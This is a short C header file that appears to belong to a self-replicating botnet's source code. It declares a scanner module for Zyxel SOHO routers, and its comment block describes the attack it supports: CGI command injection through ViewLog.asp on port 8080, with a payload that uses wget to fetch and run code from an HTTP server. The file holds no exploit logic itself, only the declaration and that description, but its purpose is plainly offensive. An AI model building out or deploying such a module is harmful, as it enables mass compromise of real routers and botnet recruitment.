#ifndef _ZYXEL_H
#define _ZYXEL_H

/* ============================================================================
 * ZYXEL SCANNER - SOHO Router Command Injection (Port 8080)
 * ============================================================================
 * Exploit: CGI command injection via ViewLog.asp
 * Targets: Zyxel SOHO/SMB routers globally
 * Payload: wget + execute from HTTP server
 * ============================================================================ */

#include "includes.h"

#ifdef SELFREP
void zyxel_scanner_init(void);
#endif

#endif
